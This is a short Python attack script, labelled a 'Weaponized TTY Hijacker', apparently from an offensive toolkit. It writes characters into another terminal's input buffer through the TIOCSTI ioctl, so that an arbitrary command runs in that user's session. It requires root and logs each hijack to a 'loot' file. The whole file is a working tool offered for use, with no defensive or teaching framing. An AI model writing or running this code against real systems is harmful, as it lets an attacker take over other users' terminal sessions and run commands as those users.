import os
import sys
import fcntl
import termios

def hijack_tty(target_pts, command):
    """
    Weaponized TTY Hijacker: Injects characters into a target 
    terminal buffer using TIOCSTI ioctls.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: TTY buffer injection requires UID 0.")
        sys.exit(1)

    pts_path = f"/dev/pts/{target_pts}"
    if not os.path.exists(pts_path):
        print(f"[-] Target TTY not found: {pts_path}")
        return

    print(f"[*] Hijacking {pts_path}...")
    print(f"[*] Injecting Command: {command}")

    try:
        # Open the target terminal device
        with open(pts_path, 'w') as fd:
            # Inject each character of the command followed by a newline
            for char in command + '\n':
                # TIOCSTI = 0x5412 (Terminal Input Character)
                fcntl.ioctl(fd, termios.TIOCSTI, char)
        
        print(f"[!!!] SUCCESS: Command injected into PTS/{target_pts}")
        
        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: TTY_HIJACK | Target: PTS/{target_pts} | Command: {command}\n")

    except Exception as e:
        print(f"[-] Hijack Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 164_tty_hijack <pts_number> '<command_to_run>'")
        print("Example: sudo python3 164_tty_hijack 1 'whoami > /tmp/proof.txt'")
        sys.exit(1)
    
    hijack_tty(sys.argv[1], sys.argv[2])
